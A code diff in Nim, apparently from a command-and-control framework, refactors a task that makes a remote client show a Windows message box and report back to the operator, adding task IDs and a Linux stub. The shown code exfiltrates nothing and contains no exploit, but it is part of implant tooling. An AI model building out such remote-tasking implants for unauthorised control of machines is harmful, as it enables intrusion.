@@ -9,15 +9,19 @@ when defined(client):
         import winim/[inc/lm, lean]
 
 when defined(server):
-    proc sendTask*(client: C2Client, title: string, caption: string) {.async.} =
-        let j = %*
+    proc sendTask*(client: C2Client, title: string, caption: string): Future[Task] {.async.} =
+        return await client.sendClientTask("msgbox", %*
             {
-                "task": "msgbox",
                 "title": title,
                 "caption": caption
-            }
-        await client.sendClientTask($j)
+            })
 
 when defined(client):
-    proc executeTask*(client: net.Socket, title: string, caption: string) =
-        MessageBox(0, title, caption, 0)
+    when defined(windows):
+        proc executeTask*(socket: net.Socket, taskId: int, title: string, caption: string) =
+            MessageBox(0, title, caption, 0)
+            socket.sendOutput(taskId, "", "", "")
+    when defined(linux):
+        proc executeTask*(socket: net.Socket, taskId: int, title: string, caption: string) =
+            socket.sendOutput(taskId, "", "", "Operation not supported on Linux")
+         
